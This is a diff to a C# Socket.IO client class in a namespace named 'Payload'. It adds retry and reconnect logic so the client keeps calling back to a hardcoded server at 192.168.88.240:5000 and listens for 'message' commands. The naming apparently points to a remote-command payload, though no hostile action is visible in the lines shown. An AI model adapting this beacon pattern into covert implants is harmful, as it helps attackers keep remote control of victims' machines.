@@ -14,6 +14,7 @@ namespace Payload.Command.SocketClient
     public class SocketIOClientCommand : Payload.Command.Interface.ICommand
     {
         SocketIO client;
+        bool ReTry = false;
         public SocketIOClientCommand() : base()
         {
             Init();
@@ -23,8 +24,12 @@ namespace Payload.Command.SocketClient
         {
             try
             {
+                base.Interval = TimeSpan.FromMilliseconds(Config.Instance.SocketIOClientCommandDefaultInterval);
                 client = new SocketIO("http://192.168.88.240:5000");
                 client.OnConnected += Client_OnConnected;
+
+                client.OnDisconnected += Client_OnDisconnected;
+
                 client.On("message", async response =>
                 {
                     // You can print the returned data first to decide what to do next.
@@ -50,12 +55,17 @@ namespace Payload.Command.SocketClient
                     }
 
                 });
-                client.ConnectAsync().Wait();
             }
             catch (Exception e)
             {
                 Console.WriteLine(e.Message);
             }
+        }
+
+        private void Client_OnDisconnected(object sender, string e)
+        {
+            ReTry = true;
+            Execute();
         }
 
         private void Client_OnConnected(object sender, EventArgs e)
@@ -96,8 +106,15 @@ namespace Payload.Command.SocketClient
         }
 
         private async Task MainTaskAsync()
-        {            
-            
+        {
+            while (!client.Connected || ReTry)
+            {
+                if(!client.Connected)
+                    client.ConnectAsync().Wait();
+                if (client.Connected)
+                    break;
+                Task.Delay(base.Interval, base.Token).Wait();
+            }
         }
 
     }
